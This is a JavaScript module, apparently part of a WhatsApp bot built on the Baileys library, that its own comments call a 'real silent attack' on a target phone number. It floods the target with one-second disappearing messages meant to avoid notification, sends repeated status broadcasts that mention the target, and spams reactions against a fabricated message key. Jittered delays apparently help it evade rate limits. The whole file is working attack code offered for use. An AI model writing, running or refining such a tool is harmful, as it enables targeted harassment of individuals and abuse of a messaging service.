// lib/rizoinvis.js
// RIZOINVIS — real silent attack
// Disappearing message flood (no notification) + status bomb
// Silent because messages expire, target ko count nahi milta

const crypto = require('crypto');
const { delay } = require('@whiskeysockets/baileys');

const CONFIG = {
    // disappearing message flood
    DM_COUNT: 30,
    DM_DELAY_MS: 1500,
    DM_EXPIRE_SECONDS: 1,          // 1 second — turant delete

    // status bomb (silent variant)
    STATUS_COUNT: 10,
    STATUS_DELAY_MS: 5000,

    // reaction spam
    REACTION_COUNT: 20,
    REACTION_DELAY_MS: 2000
};

function jitter(base) {
    return base + (Math.random() * 2 - 1) * base * 0.5;
}

function pickText() {
    const t = ['.', '..', '...', '•', '◦', '▪', '▫', '-', '_', '~'];
    return t[Math.floor(Math.random() * t.length)];
}

// ═══════════════════════════════════════════
//  VECTOR 1 — DISAPPEARING MESSAGE FLOOD
//  1-second expire, target ko notification ke bina
// ═══════════════════════════════════════════
async function vecDisappearing(sock, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.DM_COUNT; i++) {
        try {
            await sock.sendMessage(targetJid, {
                text: pickText(),
                contextInfo: {
                    expiration: CONFIG.DM_EXPIRE_SECONDS,
                    ephemeralSettingTimestamp: Date.now(),
                    silent: true
                }
            });
            sent++;
            state.success++;
            if (onProgress) onProgress(state.success, state.total, 'disappear');
        } catch (err) {
            state.errors++;
            console.error('[rizoinvis] dm err:', err.message);
        }
        await delay(jitter(CONFIG.DM_DELAY_MS));
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 2 — STATUS BOMB
//  Target ko status notifications
// ═══════════════════════════════════════════
async function vecStatusBomb(sock, targetJid, onProgress, state) {
    let sent = 0;
    for (let i = 0; i < CONFIG.STATUS_COUNT; i++) {
        try {
            await sock.sendMessage('status@broadcast', {
                text: '▪ @' + targetJid.split('@')[0],
                mentions: [targetJid],
                contextInfo: { statusMentions: [targetJid] }
            }, {
                statusJidList: [targetJid]
            });
            sent++;
            state.success++;
            if (onProgress) onProgress(state.success, state.total, 'status');
        } catch (err) {
            state.errors++;
            console.error('[rizoinvis] status err:', err.message);
        }
        await delay(CONFIG.STATUS_DELAY_MS);
    }
    return sent;
}

// ═══════════════════════════════════════════
//  VECTOR 3 — REACTION SPAM
//  Target ke last message pe 20 different reactions
// ═══════════════════════════════════════════
async function vecReactionSpam(sock, targetJid, onProgress, state) {
    let sent = 0;
    const emojis = ['❤️','👍','😂','😮','😢','🙏','🔥','💯','👏','🎉',
                    '😎','🤔','😱','🤯','💀','👀','🤡','💩','🤮','😡'];

    // get last message from target
    try {
        // try to get a message — need to have chat open
        const fakeKey = {
            remoteJid: targetJid,
            fromMe: false,
            id: 'STATUS_MSG',
            participant: targetJid
        };

        for (let i = 0; i < CONFIG.REACTION_COUNT && i < emojis.length; i++) {
            try {
                await sock.sendMessage(targetJid, {
                    react: { text: emojis[i], key: fakeKey }
                });
                sent++;
                state.success++;
                if (onProgress) onProgress(state.success, state.total, 'reaction');
            } catch (err) {
                state.errors++;
            }
            await delay(jitter(CONFIG.REACTION_DELAY_MS));
        }
    } catch (err) {
        console.error('[rizoinvis] reaction err:', err.message);
    }
    return sent;
}

// ═══════════════════════════════════════════
//  MAIN — RIZOINVIS
// ═══════════════════════════════════════════
async function Rizoinvis(sock, targetNum, mode, onProgress) {
    const targetJid = targetNum + '@s.whatsapp.net';
    const state = { success: 0, errors: 0, errorRate: 0, total: 0 };
    const vectors = [];

    const updateErr = () => {
        const t = state.success + state.errors;
        state.errorRate = t > 0 ? state.errors / t : 0;
    };

    const run = async (name, fn) => {
        try {
            const s = await fn();
            updateErr();
            if (s > 0) vectors.push(name);
        } catch (err) {
            console.error(`[rizoinvis] ${name} fatal:`, err.message);
            state.errors++; updateErr();
        }
    };

    if (mode === 'disappear' || mode === 'all') {
        state.total += CONFIG.DM_COUNT;
        await run('disappear', () => vecDisappearing(sock, targetJid, onProgress, state));
    }

    if (mode === 'status' || mode === 'all') {
        state.total += CONFIG.STATUS_COUNT;
        await run('status', () => vecStatusBomb(sock, targetJid, onProgress, state));
    }

    if (mode === 'reaction' || mode === 'all') {
        state.total += CONFIG.REACTION_COUNT;
        await run('reaction', () => vecReactionSpam(sock, targetJid, onProgress, state));
    }

    return {
        ok: state.success > 0,
        sent: state.success,
        errors: state.errors,
        errorRate: state.errorRate.toFixed(2),
        vectors
    };
}

module.exports = { Rizoinvis, CONFIG };